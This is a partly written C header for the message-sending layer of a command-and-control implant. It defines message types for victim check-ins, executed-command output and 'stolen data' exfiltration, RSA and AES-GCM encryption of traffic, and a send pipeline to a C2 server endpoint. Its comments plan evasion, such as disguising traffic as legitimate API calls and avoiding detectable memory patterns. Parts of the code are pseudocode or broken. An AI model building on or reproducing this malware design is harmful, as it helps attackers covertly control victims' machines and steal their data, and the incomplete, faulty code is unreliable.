/* MessagePublisher.h (rename this later?) */ 
/* MessagePublisher.h handles all publishing of messages to server */

/* define structures of outgoing messages/packets */

// raw command/data ---> encrypt ---> encode ---> send data to server (in chunks?)

// NOTE: AES key will need to be shared via RSA key exchange or TLS handshake

// CipherText and Tag come from encryption
// IV is just some randomly generated bytes (12 bytes for aes-gcm)
// send Base64(IV + CipherText + Tag)



// RSA
/* NOTE: private key should only be on server
 * # Generate private key
 * openssl genpkey -algorithm RSA -out private.pem -pkeyopt rsa_keygen_bits:2048
 *
 * NOTE: public key should be embedded inside the implant
 * # Extract public key
 * openssl rsa -pubout -in private.pem -out public.pem
 *
 * NOTE: common approach is to just use one key pair
 */

/*
 * Load public key from PEM file
 */
EVP_PKEY* load_public_key(const char* filename) {
	FILE *fp = fopen(filename, "r");
	if (!fp) return NULL;

	EVP_PKEY *key = PEM_read_PUBKEY(fp, NULL, NULL, NULL);
	fclose(fp);
	return key;

}

/*
 * TODO: this func doesn't need to be in client? move to server
 * Load private key from PEM file  
 */
EVP_PKEY* load_private_key(const char* filename) {
	FILE *fp = fopen(filename, "r");
	if (!fp) return NULL;

	EVP_PKEY *key = PEM_read_PrivateKey(fp, NULL, NULL, NULL);
	fclose(fp);
	return key;
}

// createHeader() ?


/*
STRUCT C2Message:
message_id: String = GENERATE_UUID()
victim_id: String
timestamp: Long
message_type: Enum = [
	HANDSHAKE,           Initial connection
	HEARTBEAT,          // Regular check-in
	SYSTEM_INFO,        // Victim system data
	COMMAND_RESULT,     // Output from executed command
	DATA_EXFIL,         // Stolen data
	FILE_UPLOAD,        // File transfer
	ERROR_REPORT        // Error information

]
payload: EncryptedData
compression: Boolean
priority: Integer
END STRUCT
*/

/*
typedef struct {
	bool use_compression;
	SerializationType serialization_type;
	ProtocolType protocol;
	CryptoKey crypto_key;
	Endpoint server_endpoint;

} Config;
*/

// TODO: eventually should use custom struct instead of json
// b64 encoding is only needed in text-only protocols (http)
// json / custom struct -> compress (if needed) -> serialize -> encrypt (+ hmac if encryption doesn't have builtin auth) -> encode -> send?

// json / custom struct -> compress (if needed) -> serialize -> encrypt (+ hmac if encryption doesn't have builtin auth) -> tlv -> send?


/*
struct Name
{
	// stuff
};
typedef Name NewName
*/



///////////////////////////////////////////////



// NOTE: InternalMessage will have to serialize,encrypt,enocde,...etc both the header and payload separately? then combine them together into one array?
// ex: serialize(InternalMessage) wont work, need to do serialize(InternalMessage.header) + serialize(InternalMessage.payload)
// NOTE: this stuct will be easier to detect (struct containing structs), instead of just having the raw fields listed out
struct InternalMessage 
{
	MessageHeader header; // the header... always use custom header? no need for tlv... MessageType enum should be defined in header
	MessageData payload; // the actual payload
}; 


// NOTE: Config is the config that comes from the C2 profile
// return non-zero on error
int send(MessageData* data, Config* config)
{
 	// stealthier than creating a Buffer struct
	// other option would be to create multiple buffers to avoid single large allocation
	uint8_t buf = {0};

	// 1. Serialize
	serialize_data(data, &buf, config->serialization_type); // TODO: check return type if there were any errors

	// 2. Compress (optional)
	compress_if_needed(&buf, config->use_compression);

	// 3. Encrypt + Authenticate (GCM does both)
	aes_gcm_encrypt(&buf, config->crypto_key);

	// 4. Package with auth tag (if encryption doesn't have auth stuff?)... (TLV or encode) 
	package_with_auth_tag(&buf, config->protocol);

	// 5. Send
	send_data(&buf, config->server_endpoint);

	// cleanup: free buf
	return 0;
}

// raw binary is possible
// 	- direct tcp, tls/ssl sockets, udp, raw icmp/dns, 

// NOTE: we wrap message into json to make it more stealthy and look like a legit api / web traffic... TODO: do this once everything is working
// MessageData -> serialize into bytes -> encrypt bytes -> create InternalMessage (using header and bytes we encrypted) -> encode if needed: if raw, send direct binary bytes, but if http, then base64+json wrap -> send
